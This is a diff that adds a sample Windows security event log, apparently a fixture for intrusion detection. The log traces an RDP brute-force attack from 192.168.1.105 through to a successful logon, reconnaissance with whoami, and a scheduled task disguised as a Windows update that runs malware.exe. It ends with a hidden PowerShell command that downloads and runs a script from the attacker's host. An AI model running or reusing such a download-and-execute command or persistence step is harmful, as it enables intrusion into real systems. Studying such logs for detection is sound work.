@@ -1,0 +1,11 @@
+{"TimeCreated":"2024-03-15T14:28:12Z","EventID":4625,"LogonType":10,"IpAddress":"192.168.1.105","TargetUserName":"admin","FailureReason":"Unknown user name or bad password","Status":"0xC000006D","SubStatus":"0xC000006A"}
+{"TimeCreated":"2024-03-15T14:28:45Z","EventID":4625,"LogonType":10,"IpAddress":"192.168.1.105","TargetUserName":"admin","FailureReason":"Unknown user name or bad password","Status":"0xC000006D","SubStatus":"0xC000006A"}
+{"TimeCreated":"2024-03-15T14:29:18Z","EventID":4625,"LogonType":10,"IpAddress":"192.168.1.105","TargetUserName":"administrator","FailureReason":"Unknown user name or bad password","Status":"0xC000006D","SubStatus":"0xC000006A"}
+{"TimeCreated":"2024-03-15T14:29:52Z","EventID":4625,"LogonType":10,"IpAddress":"192.168.1.105","TargetUserName":"administrator","FailureReason":"Unknown user name or bad password","Status":"0xC000006D","SubStatus":"0xC000006A"}
+{"TimeCreated":"2024-03-15T14:30:25Z","EventID":4625,"LogonType":10,"IpAddress":"192.168.1.105","TargetUserName":"user01","FailureReason":"Unknown user name or bad password","Status":"0xC000006D","SubStatus":"0xC000006A"}
+{"TimeCreated":"2024-03-15T14:31:02Z","EventID":4625,"LogonType":10,"IpAddress":"192.168.1.105","TargetUserName":"admin","FailureReason":"Unknown user name or bad password","Status":"0xC000006D","SubStatus":"0xC000006A"}
+{"TimeCreated":"2024-03-15T14:31:38Z","EventID":4625,"LogonType":10,"IpAddress":"192.168.1.105","TargetUserName":"admin","FailureReason":"Unknown user name or bad password","Status":"0xC000006D","SubStatus":"0xC000006A"}
+{"TimeCreated":"2024-03-15T14:32:18Z","EventID":4624,"LogonType":10,"IpAddress":"192.168.1.105","TargetUserName":"admin","IpAddress":"192.168.1.105","LogonProcessName":"User32","AuthenticationPackageName":"Negotiate"}
+{"TimeCreated":"2024-03-15T14:33:00Z","EventID":4688,"ProcessName":"cmd.exe","ParentProcessName":"svchost.exe","CommandLine":"cmd.exe /c whoami"}
+{"TimeCreated":"2024-03-15T14:33:45Z","EventID":4698,"TaskName":"\\Microsoft\\Windows\\Update","Path":"C:\\Temp\\malware.exe","Author":"SYSTEM"}
+{"TimeCreated":"2024-03-15T14:34:20Z","EventID":4688,"ProcessName":"powershell.exe","ParentProcessName":"cmd.exe","CommandLine":"powershell -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.105/download.ps1'))\""}
